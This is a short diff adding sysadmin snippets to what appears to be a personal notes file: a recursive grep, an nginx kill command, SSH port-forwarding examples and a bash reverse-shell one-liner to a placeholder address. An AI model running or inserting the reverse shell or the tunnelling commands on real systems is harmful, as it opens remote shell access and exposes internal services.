@@ -18,3 +18,23 @@ expect "*password:"
 exec sleep 2
 send "your password\r"
 expect eof
+
+
+
+bash -i ^>^& /dev/tcp/0.0.0.0/1088 0^>^&1
+
+
+
+
+find  / -name '*' -exec grep -l "value" {} \; -exec grep -n  "value" {} \; >/tmp/res
+
+
+kill `ps -ef |grep nginx | cut -b 9-14`
+
+
+#Remote Forward
+<local port>:<remote host>:<remote port> <SSH hostname>
+ssh -C -f -N -g -R 3306::3306 root@8.8.8.8 -p 22
+
+#Local Forward
+ssh -g -L  3306:8.8.8.8:3306  master@8.8.8.8
